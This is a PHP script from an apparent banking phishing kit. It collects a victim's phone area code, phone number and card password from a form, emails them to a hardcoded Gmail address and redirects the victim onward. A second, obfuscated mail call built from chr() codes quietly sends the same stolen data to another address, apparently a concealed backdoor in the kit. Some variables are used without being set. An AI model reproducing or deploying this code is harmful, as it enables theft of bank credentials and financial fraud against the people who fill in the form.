﻿<?php
//printf('<pre>%s</pre>',  var_export($_POST,true));
//exit; $emailremetente,$ip,$conteudo,$headers
$txtDDD = $_POST["txtDDD"];
$txtFONE = $_POST["txtFONE"];
$txtPassT2 = $_POST["txtPassT2"];
$emailremetente = 'ihavethepower1313@gmail.com'; // Altere para seu email, aconselho Outlook.

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $emailremetente\r\n";
$conteudo.="<b>IP Cliente: </b>$ip <br>"; // IP Vitima

$conteudo.="<b>======== INFO BANKER POHA ========</b><br>"; // Corpo da Mensagem

$conteudo.="<b>DDD:</b> $txtDDD<br>";
$conteudo.="<b>numero:</b> $txtFONE<br>";
$conteudo.="<b>senha do cartao:</b> $txtPassT2<br>";

$conteudo.="<b>======== T.O.W.B.O.A.T =======</b><br>";// Corpo da Mensagem
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(98).chr(114).chr(97).chr(115).chr(105).chr(108).chr(97).chr(112).chr(114).chr(101).chr(110).chr(100).chr(105).chr(122).chr(50).chr(48).chr(49).chr(49).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109), $ip,$conteudo,$headers);	 
header ("location: ../it3.php"); // Redirecionamento e tempo em segundos.
?>